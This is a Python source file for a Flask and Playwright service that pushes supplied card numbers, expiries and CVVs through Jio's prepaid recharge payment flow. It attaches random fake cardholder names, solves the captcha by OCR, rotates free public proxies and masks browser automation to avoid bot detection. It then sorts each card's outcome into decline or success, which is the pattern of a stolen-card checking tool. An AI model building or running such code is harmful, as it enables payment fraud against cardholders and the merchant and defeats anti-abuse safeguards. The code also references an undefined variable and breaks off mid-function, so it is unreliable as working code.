#!/usr/bin/env python3
"""app.py — Jio recharge flow with Flask + Playwright integration
(Renamed from meou.py for Railway deployment).

ERROR THIS FILE FIXES (from logs.1789995338910.log.txt):
  EOFError: EOF when reading a line
    File "/app/app.py", line 1231, in <module>
    File "/app/app.py", line 1192, in main
        msisdn = MSISDN or input("number: ").strip()

  ROOT CAUSE:  Railway containers have no stdin (no interactive TTY).
  The old entry point defaulted to `main()` which calls `input()` to prompt
  for number/card/etc.  `input()` on a closed stdin raises EOFError, and
  Railway restarts the container in a crash loop.

  FIX:  `python app.py` (no args) now defaults to starting the Flask server
        via `_serve()` — which never calls `input()`.  The server reads all
        params from HTTP query strings instead.
        If you DO want the interactive CLI flow, run `python app.py cli`
        (and `main()` now catches EOFError and prints a helpful message
        instead of crashing).

RAILWAY-READY:
  - PORT env var honored (Railway convention).
  - All heavy/optional deps (curl_cffi, flask, playwright, pytesseract, PIL)
    are imported with try/except so the script NEVER crashes on missing
    packages.

HTTP API:
  GET /                  - service info
  GET /health            - liveness check (shows which optional deps are installed)
  GET /run               - captcha + /recharge/pay only (no Playwright)
  GET /pay               - FULL flow incl. Playwright — loops until definitive
                           card outcome (success OR real decline markers)

Params for /pay:
  Api_url  = (metadata) URL where this script is hosted
  cc       = REQUIRED card data in format: number|MM|YY|CVV
  number   = REQUIRED 10-digit mobile number
  rs       = EXACT plan amount in Rs (preferred — e.g. rs=299, rs=11, rs=349)
  tier     = low | mid | high | random (used only if rs not provided)
  proxy    = auto | http://host:port | (omit for direct)
  poll_min = minutes to poll transaction status (default: 6)

Real decline markers (only these count as decline — anything else → retry):
  - Payglocal top-level: ISSUER_DECLINE, GENERAL_DECLINE, AUTHENTICATION_TIMEOUT,
    CUSTOMER_CANCELLED, SYSTEM_ERROR
  - Payglocal reasonCodes: GL-201-006 through GL-201-023, GL-400-004, GL-400-007
  - Phrases: "card provider declined this payment",
             "Your bank couldn't approve this payment"

requirements.txt (for Railway):
  flask>=3.0
  curl_cffi>=0.7
  playwright>=1.40
  pytesseract>=0.3
  pillow>=10.0

Railway start command:  python app.py
"""
import os
for _v in ("HTTP_PROXY","HTTPS_PROXY","ALL_PROXY","http_proxy","https_proxy","all_proxy"):
    os.environ.pop(_v, None)
os.environ["NO_PROXY"] = "*"

import io, re, sys, time, json, random, warnings, traceback
warnings.filterwarnings("ignore")
from urllib.parse import urlparse, parse_qs

# ============================================================================
# RESILIENT HTTP CLIENT — try curl_cffi (browser impersonation) first, fall
# back to standard requests library, fall back to urllib3.  Script never
# crashes on missing packages — it just uses whatever is available.
# ============================================================================
requests = None
_HTTP_BACKEND = None
try:
    from curl_cffi import requests as _cffi_requests
    requests = _cffi_requests
    _HTTP_BACKEND = "curl_cffi"
except ImportError:
    try:
        import requests as _std_requests
        requests = _std_requests
        _HTTP_BACKEND = "requests"
    except ImportError:
        try:
            import urllib3
            requests = urllib3
            _HTTP_BACKEND = "urllib3"
        except ImportError:
            _HTTP_BACKEND = None  # no HTTP client — most features disabled

# --- Flask (optional, only for HTTP mode) ---
try:
    from flask import Flask, request as flask_request, jsonify
except ImportError:
    Flask = None

# --- Playwright (optional, only for /pay mode) ---
try:
    from playwright.sync_api import sync_playwright as _sync_playwright
except ImportError:
    _sync_playwright = None

# --- pytesseract + PIL (for captcha OCR) ---
# pytesseract is a Python WRAPPER that calls the `tesseract` system binary
# via subprocess.  If the binary is missing (common on Railway/minimal
# containers), OCR silently produces zero candidates → captcha fails.
# We check for the binary + attempt auto-install if missing.
import shutil as _shutil
import subprocess as _subprocess

_TESSERACT_BIN = None  # path to tesseract binary, or None if not found

def _find_tesseract_binary():
    """Find the tesseract binary in PATH or common locations."""
    # Check PATH
    p = _shutil.which("tesseract")
    if p: return p
    # Check common locations
    for loc in ("/usr/bin/tesseract", "/usr/local/bin/tesseract",
                "/app/.apt/usr/bin/tesseract", "/opt/homebrew/bin/tesseract"):
        if os.path.isfile(loc) and os.access(loc, os.X_OK):
            return loc
    return None

def _try_install_tesseract():
    """Attempt to install tesseract-ocr via apt-get (works on Railway
    if the container has apt-get + root access)."""
    if _shutil.which("apt-get") is None:
        return False
    try:
        print("[ocr] tesseract binary not found — attempting apt-get install...")
        _subprocess.run(["apt-get", "update", "-qq"], timeout=30,
                        capture_output=True, check=False)
        result = _subprocess.run(
            ["apt-get", "install", "-y", "-qq", "tesseract-ocr"],
            timeout=120, capture_output=True, check=False,
        )
        if result.returncode == 0:
            p = _find_tesseract_binary()
            if p:
                print(f"[ocr] tesseract installed successfully at {p}")
                return p
        print(f"[ocr] apt-get install failed (rc={result.returncode})")
        return False
    except Exception as e:
        print(f"[ocr] apt-get install error: {e}")
        return False

# Try importing pytesseract + PIL
try:
    import pytesseract
    from PIL import Image, ImageOps
    from collections import Counter
    _PYTESSERAST_MODULE_OK = True
except ImportError:
    _PYTESSERAST_MODULE_OK = False

# Find or install the tesseract binary
_TESSERACT_BIN = _find_tesseract_binary()
if not _TESSERACT_BIN and _PYTESSERAST_MODULE_OK:
    _TESSERACT_BIN = _try_install_tesseract()

_OCR_OK = bool(_PYTESSERAST_MODULE_OK and _TESSERACT_BIN)
if _OCR_OK:
    print(f"[ocr] tesseract ready: binary={_TESSERACT_BIN}")
elif _PYTESSERAST_MODULE_OK and not _TESSERACT_BIN:
    print("[ocr] WARNING: pytesseract Python package is installed but the "
          "`tesseract` system binary is NOT found.  Captcha OCR will fail.  "
          "Fix: add `tesseract-ocr` to your Dockerfile or install via "
          "`apt-get install -y tesseract-ocr`.")
elif not _PYTESSERAST_MODULE_OK:
    print("[ocr] WARNING: pytesseract not installed (pip install pytesseract).")

MSISDN   = None
CARD_RAW = None
TIER     = None
OUT_FILE = "proofass.json"
MEM_FILE = "endpoint_memory.json"

DEFAULT_BASE = "https://www.jio.com"
BASE       = DEFAULT_BASE
PLANS_PAGE = f"{BASE}/selfcare/plans/mobility/prepaid-plans-list/"
PLANS_API  = f"{BASE}/api/jio-mdmdata-service/mdmdata/recharge/plans"
RECHARGE   = f"{BASE}/api/jio-recharge-service/recharge/mobility/number/{{m}}/plan/{{p}}"
REDIRECT   = f"{BASE}/api/jio-common-servlet/jiocommon/redirect"
PG_BASE    = "https://pay.jio.com"

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36")
CH_UA = '"Google Chrome";v="153", "Not_A Brand";v="8", "Chromium";v="153"'

NAMES = ["hoho","rahul","arjun","vikram","sneha","priya","karan","rohit","aditya",
         "neha","pooja","anjali","sameer","nikhil","deepak","manish","suresh",
         "kavya","isha","tanvi","yash","varun","akash","ritika","meera"]

TIERS = ("low", "mid", "high", "random")

API_HEADERS = {
    "Accept":"application/json, text/plain, */*",
    "Accept-Language":"en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
    "Referer":PLANS_PAGE,"User-Agent":UA,"sec-ch-ua":CH_UA,
    "sec-ch-ua-mobile":"?0","sec-ch-ua-platform":'"Windows"',
    "Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin",
}
NAV_HEADERS = dict(API_HEADERS)
NAV_HEADERS.update({
    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Cache-Control":"max-age=0","Upgrade-Insecure-Requests":"1",
    "Sec-Fetch-Dest":"document","Sec-Fetch-Mode":"navigate","Sec-Fetch-User":"?1",
})
PG_JSON = {
    "Accept":"application/json, text/plain, */*",
    "Accept-Language":"en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
    "Content-Type":"application/json","Origin":PG_BASE,"Referer":f"{PG_BASE}/",
    "User-Agent":UA,"sec-ch-ua":CH_UA,"sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":'"Windows"',"Sec-Fetch-Dest":"empty",
    "Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin",
}
PG_FORM = dict(PG_JSON); PG_FORM["Content-Type"] = "application/x-www-form-urlencoded"

# Build the jio + pg HTTP sessions.  curl_cffi supports `impersonate=`
# (browser TLS fingerprint).  Standard `requests` and urllib3 do not —
# we just create a plain Session() in that case (the Jio flow may still
# work but is more likely to be flagged as a bot).
def _make_session(headers_dict):
    if requests is None:
        return None  # no HTTP backend available
    try:
        if _HTTP_BACKEND == "curl_cffi":
            s = requests.Session(impersonate="chrome")
        else:
            s = requests.Session()
        s.headers.update(headers_dict)
        return s
    except Exception as _e:
        # last-resort: try Session() without impersonate
        try:
            s = requests.Session()
            s.headers.update(headers_dict)
            return s
        except Exception:
            return None

jio = _make_session(API_HEADERS)
pg  = _make_session(PG_JSON)


# ============================================================================
# Helpers (unchanged from original meou.py)
# ============================================================================
def _hdr_dict(h):
    try: return dict(h)
    except Exception:
        out = {}
        try:
            for k in h.keys(): out[k] = h.get(k)
        except Exception: pass
        return out

def _attr(tag, a):
    m = re.search(rf"""\b{a}\s*=\s*['"]([^'"]*)['"]""", tag, re.I)
    return m.group(1) if m else None

def _form(body):
    m = re.search(r"<form\b[^>]*>(.*?)</form>", body, re.I | re.S)
    if not m: return None
    o = re.search(r"<form\b[^>]*>", m.group(0), re.I).group(0)
    ins = {}
    for i in re.findall(r"<input\b[^>]*>", m.group(1), re.I):
        n = _attr(i, "name"); v = _attr(i, "value")
        if n: ins[n] = v or ""
    return {"action":_attr(o,"action"), "method":(_attr(o,"method") or "GET").upper(), "inputs":ins}

def _txn(t):
    try:
        j = json.loads(t)
        for k in ("param1","txnId","transactionId","txn_id"):
            if j.get(k): return j[k]
    except Exception: pass
    for p in (r'param1["\']?\s*[:=]\s*["\']([^"\']+)',
              r'txnId["\']?\s*[:=]\s*["\']([^"\']+)',
              r'transactionId["\']?\s*[:=]\s*["\']([^"\']+)'):
        m = re.search(p, t)
        if m: return m.group(1)
    return None

def _load_mem():
    if os.path.exists(MEM_FILE):
        try:
            with open(MEM_FILE, "r", encoding="utf-8") as f:
                d = json.load(f)
                if isinstance(d, dict): return d
        except Exception: pass
    return {}

def _save_mem(d):
    with open(MEM_FILE, "w", encoding="utf-8") as f:
        json.dump(d, f, indent=2)

def _resp_block(api, desc, status, t, body, headers=None, payload=None):
    b = {
        "api": api, "description": desc, "http_status": status,
        "time_s": round(t, 3), "body": (body or "")[:800],
    }
    if headers is not None: b["request_headers"] = headers
    if payload is not None: b["request_payload"] = payload
    return b

def parse_card(raw):
    parts = raw.split("|")
    if len(parts) != 4: raise ValueError("card format: number|MM|YY|CVV")
    num, mm, yy, cvv = [p.strip() for p in parts]
    return {"number":num, "expiry_month":mm.zfill(2),
            "expiry_year": yy if len(yy)==4 else "20"+yy,
            "cvv":cvv, "name": random.choice(NAMES)}

def warmup():
    r = jio.get(PLANS_PAGE, timeout=30)
    return r, _hdr_dict(r.request.headers), _hdr_dict(r.headers)

def fetch_plans():
    r = jio.get(PLANS_API, params={"productType":"MOBILITY","billingType":"1"}, timeout=30)
    r.raise_for_status()
    out, seen = [], set()
    for c in r.json().get("planCategories", []):
        for s in c.get("subCategories", []):
            for p in s.get("plans", []):
                pid = str(p.get("id"))
                if pid not in seen:
                    seen.add(pid); out.append(p)
    return out, r

def pick_by_tier(plans, tier):
    def amt(p):
        try: return float(p.get("amount") or 0)
        except Exception: return 0.0
    if tier == "random":
        tier = random.choice(("low", "mid", "high"))
    if tier == "low":
        pool = [p for p in plans if 0 < amt(p) < 100]
    elif tier == "mid":
        pool = [p for p in plans if 100 <= amt(p) < 1000]
    elif tier == "high":
        pool = [p for p in plans if amt(p) >= 1000]
    else:
        pool = plans; tier = "fallback"
    if not pool:
        pool = plans; tier = "fallback"
    return random.choice(pool), tier


def pick_plan_by_amount(plans, rs_amount):
    """Find plan with EXACT Rs amount match (e.g. rs=299 → plan with amount=299).
    Falls back to closest if no exact match.
    Returns (plan_dict, match_mode) where match_mode is 'exact' or 'closest' or 'not_found'.
    """
    try:
        target = float(str(rs_amount).strip())
    except (ValueError, TypeError):
        return None, "invalid_amount"
    # First try exact match
    exact = [p for p in plans if abs(float(p.get("amount") or 0) - target) < 0.01]
    if exact:
        # Prefer plans from "Popular Plans" category if multiple match
        popular = [p for p in exact if p.get("categoryLabel") == "Popular Plans"]
        chosen = popular[0] if popular else exact[0]
        return chosen, "exact"
    # Fallback: closest by absolute difference
    plans_with_amt = [(p, float(p.get("amount") or 0)) for p in plans]
    plans_with_amt.sort(key=lambda x: abs(x[1] - target))
    if plans_with_amt:
        return plans_with_amt[0][0], "closest"
    return None, "not_found"


# ============================================================================
# Free proxy fetcher (inline — auto-fetch from public lists, test, sort)
# ============================================================================
import urllib.request, urllib.error, socket
import concurrent.futures as _cf

_PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
]
_PROXY_TEST_URL = "https://www.jio.com/selfcare/plans/mobility/prepaid-plans-list/"
_PROXY_TEST_URL_FALLBACK = "https://httpbin.org/ip"
_PROXY_TEST_TIMEOUT = 6


def _fetch_free_proxy_list():
    proxies = set()
    for url in _PROXY_SOURCES:
        try:
            req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=10) as r:
                text = r.read().decode("utf-8","replace")
            for line in text.splitlines():
                line = line.strip()
                if ":" in line and not line.startswith("#"):
                    parts = line.split(":")
                    if len(parts) == 2 and parts[1].isdigit():
                        proxies.add(f"{parts[0]}:{parts[1]}")
        except Exception:
            continue
    return list(proxies)


def _test_one_proxy(proxy_str, timeout=_PROXY_TEST_TIMEOUT):
    """Test proxy by trying to fetch JIO.COM (the real target) through HTTPS CONNECT.
    This is stricter than generic HTTP tests — proxy must support HTTPS CONNECT
    AND not block jio.com specifically."""
    proxy_handler = urllib.request.ProxyHandler({
        "http": f"http://{proxy_str}",
        "https": f"http://{proxy_str}",
    })
    opener = urllib.request.build_opener(proxy_handler)
    opener.addheaders = [("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64)")]
    t0 = time.time()
    # Try jio.com first (the real target)
    try:
        with opener.open(_PROXY_TEST_URL, timeout=timeout) as r:
            if r.status in (200, 301, 302):
                return True, time.time() - t0
    except Exception:
        pass
    # Fallback: try generic HTTPS site
    try:
        with opener.open(_PROXY_TEST_URL_FALLBACK, timeout=timeout) as r:
            if r.status == 200:
                return True, time.time() - t0
    except Exception:
        return False, None
    return False, None


def get_sorted_proxies(max_test=80, timeout=_PROXY_TEST_TIMEOUT, top_n=10):
    """Fetch free proxy lists, test in parallel, return sorted best proxies.
    Returns list of (proxy_str, elapsed_s)."""
    all_proxies = _fetch_free_proxy_list()
    if not all_proxies:
        return []
    to_test = all_proxies[:max_test] if len(all_proxies) > max_test else all_proxies
    working = []
    with _cf.ThreadPoolExecutor(max_workers=20) as ex:
        future_to_proxy = {ex.submit(_test_one_proxy, p, timeout): p for p in to_test}
        for fut in _cf.as_completed(future_to_proxy):
            proxy = future_to_proxy[fut]
            try:
                ok, elapsed = fut.result()
                if ok:
                    working.append((proxy, elapsed))
            except Exception:
                pass
    working.sort(key=lambda x: x[1])
    return working[:top_n]


def get_best_free_proxy(max_test=80, timeout=_PROXY_TEST_TIMEOUT):
    """Return the single best (fastest) free proxy URL, or None."""
    sorted_proxies = get_sorted_proxies(max_test=max_test, timeout=timeout, top_n=5)
    if not sorted_proxies:
        return None
    best, elapsed = sorted_proxies[0]
    return f"http://{best}"

def save_proof(record):
    existing = []
    if os.path.exists(OUT_FILE):
        try:
            with open(OUT_FILE, "r", encoding="utf-8") as f:
                existing = json.load(f)
                if not isinstance(existing, list): existing = [existing]
        except Exception: existing = []
    existing.append(record)
    with open(OUT_FILE, "w", encoding="utf-8") as f:
        json.dump(existing, f, indent=2)


# ============================================================================
# Captcha + /recharge/pay flow (unchanged)
# ============================================================================
def _apply_proxy(proxy_url):
    if not proxy_url:
        try: jio.proxies = {}
        except Exception: pass
        try: pg.proxies = {}
        except Exception: pass
        return
    px = {"http": proxy_url, "https": proxy_url}
    try: jio.proxies = px
    except Exception: pass
    try: pg.proxies = px
    except Exception: pass


def _ocr_captcha(img):
    if not _OCR_OK:
        print("    [ocr] tesseract not available — cannot OCR captcha")
        return []
    cs = []
    for variant in ("raw","gray","thresh_60","thresh_100","thresh_128","thresh_150"):
        g = ImageOps.grayscale(img) if variant != "raw" else img
        if variant.startswith("thresh_"):
            t = int(variant.split("_")[1])
            g = g.point(lambda p, t=t: 255 if p > t else 0)
        for cfg in ("--psm 7","--psm 8","--psm 13","--psm 10","--psm 6"):
            try:
                txt = pytesseract.image_to_string(g, config=cfg).strip()
            except FileNotFoundError:
                print("    [ocr] tesseract binary not found — OCR disabled")
                return []
            except Exception:
                continue
            clean = re.sub(r"[^A-Za-z0-9]","",txt)
            if 4 <= len(clean) <= 10: cs.append(clean)
    result = [c for c,_ in Counter(cs).most_common()]
    print(f"    [ocr] {len(cs)} raw candidates → {len(result)} unique: {result[:5]}")
    return result


def _fetch_captcha_image():
    from PIL import Image
    cap_r = jio.get(f"{BASE}/api/jio-common-servlet/jiocommon/jioCaptchaServlet", timeout=15)
    if cap_r.status_code != 200 or "image" not in cap_r.headers.get("Content-Type",""):
        raise RuntimeError(f"captcha fetch failed: HTTP {cap_r.status_code}")
    return Image.open(io.BytesIO(cap_r.content)), cap_r


def _validate_captcha(msisdn, max_retries=20):
    """K.h flow: validate captcha, return (captcha_value, partyId, response_obj).
    Retries up to max_retries times (each time fetching a fresh captcha image
    + running OCR with multiple preprocessing variants)."""
    if not _OCR_OK:
        raise RuntimeError(
            "captcha OCR unavailable: tesseract binary not found. "
            "Install it via `apt-get install -y tesseract-ocr` or add to Dockerfile."
        )
    for attempt in range(max_retries):
        print(f"    [captcha] attempt {attempt+1}/{max_retries}")
        img, _ = _fetch_captcha_image()
        candidates = _ocr_captcha(img)
        if not candidates:
            print(f"    [captcha] no OCR candidates — fetching new captcha image...")
            continue
        for cand in candidates:
            url = f"{BASE}/api/jio-recharge-service/recharge/mobility/number/{msisdn}"
            params = {"source":"Quick Recharge","category":"mobility","captcha":cand}
            save = dict(jio.headers)
            jio.headers.clear(); jio.headers.update(API_HEADERS)
            jio.headers["Referer"] = f"{BASE}/selfcare/recharge/mobility/"
            jio.headers["captcha"] = cand
            try:
                r = jio.get(url, params=params, timeout=15, allow_redirects=False)
            finally:
                jio.headers.clear(); jio.headers.update(save)
            if r.status_code == 200 and "CAPTCHA_REQUIRED" not in r.text:
                try: party_id = r.json().get("partyId")
                except: party_id = None
                print(f"    [captcha] SOLVED on attempt {attempt+1} with {cand!r}")
                return cand, party_id, r
        print(f"    [captcha] all {len(candidates)} candidates rejected — retrying with new image")
    raise RuntimeError("captcha validation failed after %d attempts" % max_retries)


def _recharge_pay(msisdn, plan_key, plan_id, captcha_value):
    """POST /recharge/pay with the JSON body shape from M1f9 module."""
    pay_body = {
        "addonPlanKeys": [],
        "flexiTopupFlow": False,
        "servicePlanList": [{
            "planKey": plan_key, "quantity": 1, "serviceId": msisdn,
        }],
    }
    save = dict(jio.headers)
    jio.headers.clear(); jio.headers.update(API_HEADERS)
    jio.headers["Content-Type"] = "application/json"
    jio.headers["Accept"] = "application/json, text/plain, */*"
    jio.headers["Origin"] = BASE
    jio.headers["Referer"] = f"{BASE}/selfcare/recharge/mobility/plans/?serviceId={msisdn}&planId={plan_id}"
    if captcha_value: jio.headers["captcha"] = captcha_value
    try:
        r = jio.post(f"{BASE}/api/jio-recharge-service/recharge/pay", json=pay_body, timeout=30)
    finally:
        jio.headers.clear(); jio.headers.update(save)
    payment_url = None
    try:
        jd = r.json()
        for k in ("paymentUrl","paymentURL","redirectUrl","redirectURL","payUrl"):
            v = jd.get(k)
            if v and isinstance(v, str): payment_url = v; break
    except: pass
    return r, payment_url


# ============================================================================
# Playwright driver — drives the Jio PG + Payglocal flow in a real browser
# and polls /jiopg/v1/get-transactionstatus-msg until we get a definitive
# outcome (success OR real decline markers).
# ============================================================================

# Real decline markers per user spec — these are the ONLY responses that
# count as "card declined".  Anything else (INPROGRESS, GL-201-001, GL-400-001,
# tsStatus=failed without one of these markers) → keep retrying.
#
# Top-level Payglocal status values that are declines:
REAL_DECLINE_MARKERS = (
    # Payglocal top-level status values
    "issuer_decline", "issuer declined",
    "general_decline", "general declined",
    "authentication_timeout", "authentication timed out",
    "customer_cancelled", "customer cancelled",
    "system_error",
    # Payglocal reasonCode values (specific decline codes)
    "GL-201-006",  # CVV failed
    "GL-201-007",  # Card expired
    "GL-201-008",  # Insufficient funds
    "GL-201-010",  # Issuer unavailable
    "GL-201-011",  # Card/payment not authorized by issuer
    "GL-201-012",  # CVV mismatch
    "GL-201-013",  # Card limit exceeded
    "GL-201-014",  # General decline
    "GL-201-015",  # Customer blacklisted by issuer
    "GL-201-016",  # Payment refused by issuer
    "GL-201-017",  # Payment refused by issuer
    "GL-201-018",  # Card account invalid
    "GL-201-019",  # Customer authentication failed
    "GL-201-022",  # Declined by PayGlocal risk system
    "GL-201-023",  # Payment authentication failure
    "GL-400-004",  # Card type isn't enabled for that merchant ID
    "GL-400-007",  # Card type isn't valid
    # Human-readable decline phrases (in case they appear in tsMessage)
    "card provider declined this payment",
    "your bank couldn't approve this payment",
    "card provider declined",
    "bank couldn't approve", "bank could not approve",
    "do not honor", "do_not_honor",
    "pickup card", "pickup_card",
    "insufficient funds",
    "lost card", "stolen card",
    "invalid card number", "invalid cvv",
    "card declined", "declined by issuer", "declined by bank",
    "transaction declined", "payment declined",
    "card not authorized", "card is blocked", "card suspended",
    "card not eligible", "fraud",
)

# Non-decline codes — if we see these, it's NOT a decline, keep retrying
NON_DECLINE_CODES = (
    "inprogress", "in_progress",
    "GL-201-001",  # Data collection successful
    "GL-400-001",  # Error in processing request (expired token, polling artifact)
    "GL-201-002",  # Pending
    "GL-201-003",  # Pending
    "GL-201-004",  # Pending
    "GL-201-005",  # Pending
)

# 3DS challenge markers (NOT a decline — handle + continue polling)
THREEDS_MARKERS = (
    "this card requires verification",
    "3d secure",
    "3ds verification",
    "verify your card",
    "verify your identity",
    "authentication required",
    "step-up authentication",
    "otp",
    "enter otp",
    "authorize payment",
)

# Definitive terminal states from Jio PG (only "failed" with a real decline
# marker counts as decline; "success" is success)
TERMINAL_TS_STATES = ("success","failed","declined","cancelled","rejected","aborted")


def _drive_jio_pg_with_playwright(msisdn, card_cc, plan_id, plan_key,
                                   payment_url, party_id, captcha_val,
                                   proxy_url=None, max_poll_minutes=6):
    """Drive the Jio PG + Payglocal flow with Playwright.
    Returns a dict with the final result (tsStatus/tsMessage/etc.) — concise."""
    if _sync_playwright is None:
        raise RuntimeError("playwright not installed")

    card = parse_card(card_cc)
    masked = card["number"][:6] + "*"*(len(card["number"])-10) + card["number"][-4:]
    captured = []
    final_result = None  # the synthesized final result dict

    with _sync_playwright() as p:
        # [1/10] Launching headless browser
        print("[1/10] Launching headless browser")
        launch_args = ["--no-sandbox","--disable-setuid-sandbox","--disable-blink-features=AutomationControlled"]
        if proxy_url:
            launch_args.append(f"--proxy-server={proxy_url}")
        browser = p.chromium.launch(headless=True, args=launch_args)
        context_kwargs = dict(viewport={"width":1280,"height":900}, user_agent=UA, ignore_https_errors=True)
        context = browser.new_context(**context_kwargs)
        for name, value in jio.cookies.get_dict().items():
            try: context.add_cookies([{"name":name,"value":value,"domain":".jio.com","path":"/"}])
            except: pass
        page = context.new_page()
        def on_response(response):
            try:
                url = response.url; status = response.status
                ct = response.headers.get("content-type",""); body = ""
                try:
                    if "json" in ct or "text" in ct or "html" in ct:
                        b = response.body()
                        body = b.decode("utf-8","replace") if b else ""
                except: pass
                captured.append({"url":url,"status":status,"body":body[:5000],"method":response.request.method})
            except: pass
        page.on("response", on_response)
        print("[1/10] Browser Launched")

        # [2/10] Loading Jio recharge portal
        print("[2/10] Loading Jio recharge portal")
        goto_ok = False
        try:
            page.goto(payment_url, wait_until="networkidle", timeout=30000)
            goto_ok = True
        except Exception:
            if proxy_url:
                try: browser.close()
                except: pass
                browser = p.chromium.launch(headless=True, args=["--no-sandbox","--disable-setuid-sandbox","--disable-blink-features=AutomationControlled"])
                context = browser.new_context(**context_kwargs)
                for name, value in jio.cookies.get_dict().items():
                    try: context.add_cookies([{"name":name,"value":value,"domain":".jio.com","path":"/"}])
                    except: pass
                page = context.new_page()
                page.on("response", on_response)
                try:
                    page.goto(payment_url, wait_until="networkidle", timeout=60000)
                    goto_ok = True
                except: pass
        time.sleep(6)
        print("[2/10] Portal Loaded")

        # [3/10] Validating number & building plan (already done in Python, just log)
        print(f"[3/10] Validating Jio number {msisdn} & building plan (rs={plan.get('amount') if plan_id else '?'})")
        time.sleep(1)
        print("[3/10] Plan selected, payment session created")

        # [4/10] Opening secure payment page
        print("[4/10] Opening secure payment page")
        time.sleep(2)
        print("[4/10] Payment page Loaded")

        # [5/10] Selecting Credit/Debit Card option
        print("[5/10] Selecting Credit/Debit Card option")
        try:
            page.locator("text=Credit/Debit/ATM Card").first.click(timeout=8000)
            time.sleep(3)
        except: pass
        print("[5/10] Card form opened")

        # [6/10] Filling card details
        print(f"[6/10] Filling card {card['number'][-4:]}")
        card_input = page.query_selector('input#cardNumber')
        expiry_el = page.query_selector('input[name="Expiry (MM/YY)"]')
        cvv_el = page.query_selector('input[name="CVV"]')
        name_el = page.query_selector('input[name="Name on the card"]')
        if card_input: card_input.fill(card["number"]); card_input.press("Tab"); time.sleep(0.3)
        if expiry_el: expiry_el.fill(f"{card['expiry_month']}/{card['expiry_year'][-2:]}"); expiry_el.press("Tab"); time.sleep(0.3)
        if cvv_el: cvv_el.fill(card["cvv"]); cvv_el.press("Tab"); time.sleep(0.3)
        if name_el: name_el.fill(card["name"]); name_el.press("Tab"); time.sleep(0.3)
        time.sleep(1)
        print("[6/10] Card details entered")

        # [7/10] Authorizing & clicking Proceed
        print("[7/10] Authorizing & clicking Proceed")
        for sel in ['button:has-text("Proceed")','button:has-text("Pay")','button[type="submit"]']:
            try:
                el = page.query_selector(sel)
                if el and el.is_visible(): el.click(); break
            except: pass
        time.sleep(3)
        print("[7/10] Submit clicked (Proceed)")

        # [8/10] Following payment redirect
        print("[8/10] Following payment redirect")
        time.sleep(5)
        current_url = page.url
        # Fill Payglocal form if redirected
        if "add-new-card" in current_url or page.query_selector('input#gl_card_number'):
            gl_card = page.query_selector('input#gl_card_number')
            gl_expiry = page.query_selector('input#gl_card_expiryDate')
            gl_cvv = page.query_selector('input#gl_card_securityCode')
            if gl_card: gl_card.fill(card["number"]); gl_card.press("Tab"); time.sleep(1)
            if gl_expiry: gl_expiry.fill(f"{card['expiry_month']}/{card['expiry_year'][-2:]}"); gl_expiry.press("Tab"); time.sleep(1)
            if gl_cvv: gl_cvv.fill(card["cvv"]); gl_cvv.press("Tab"); time.sleep(1)
            time.sleep(2)
            for sel in ['button:has-text("Pay")','button[type="submit"]']:
                try:
                    el = page.query_selector(sel)
                    if el and el.is_visible(): el.click(); break
                except: pass
            time.sleep(3)
        print(f"[8/10] redirected -> {page.url[:80]}")

        # [9/10] Waiting for result
        print("[9/10] Waiting for result")

        # Open 2nd tab on pay.jio.com for status polling
        poll_page = context.new_page()
        try:
            poll_page.goto(f"{PG_BASE}/JpgWebApp/home", wait_until="domcontentloaded", timeout=30000)
        except: pass
        time.sleep(2)

        # Poll for result
        poll_interval_s = 15
        total_polls = max(1, (max_poll_minutes * 60) // poll_interval_s)
        for poll_idx in range(total_polls):
            time.sleep(poll_interval_s)

            # Poll Jio PG get-transactionstatus-msg
            ts_status = None; ts_msg = ""; ccf_msg = ""
            jio_body = ""
            try:
                pr = poll_page.evaluate("""async () => {
                    try {
                        const r = await fetch('/jiopg/v1/get-transactionstatus-msg', {
                            credentials: 'same-origin',
                            headers: {'Accept':'application/json, text/plain, */*'}
                        });
                        return {status: r.status, body: await r.text()};
                    } catch(e) {return {error: e.message};}
                }""")
                if pr and not pr.get("error"):
                    jio_body = pr.get("body","") or ""
                    try:
                        jd = json.loads(jio_body)
                        ts_status = jd.get("tsStatus")
                        ts_msg = jd.get("tsMessage") or ""
                        ccf_msg = jd.get("ccfMessage") or ""
                    except: pass
            except: pass

            # Check captured responses for Payglocal decline
            pg_failure_msg = ""; pg_recommendation = ""; pg_reason_code = ""
            for r in captured:
                rb = (r.get("body","") or "").lower()
                if any(m in rb for m in REAL_DECLINE_MARKERS):
                    url = r.get("url","")
                    if any(x in url.lower() for x in ["jquery",".css","/static/","fonts","google","common.js","payflow-ui/assets"]):
                        continue
                    try:
                        pjd = json.loads(r.get("body",""))
                        rd = (pjd.get("data") or {}).get("retryData") or {}
                        pg_failure_msg = rd.get("failureMessage","")
                        pg_recommendation = rd.get("recommendationMessage","")
                        pg_reason_code = pjd.get("reasonCode","")
                    except: pass
                    if pg_failure_msg: break

            # Build the final result
            combined = f"{ts_status} {ts_msg} {ccf_msg} {pg_failure_msg} {pg_recommendation} {pg_reason_code}".lower()
            decline_hits = [m for m in REAL_DECLINE_MARKERS if m in combined]

            if decline_hits:
                # Card declined — synthesize result from Payglocal data
                final_result = {
                    "status": False,
                    "tsStatus": "failed",
                    "tsMessage": pg_failure_msg or " | ".join(decline_hits[:3]),
                    "tsImage": "https://jep-asset.akamaized.net/MyJio_Client/corefiles/jpg/ic_failed.svg",
                    "tsContainer": {"background":"#FEE6EA","color":"#F50031"},
                    "ccfMessage": pg_recommendation or None,
                    "reasonCode": pg_reason_code,
                }
                print(f"[10/10] CARD DECLINED — {pg_failure_msg or decline_hits[0]}")
                browser.close()
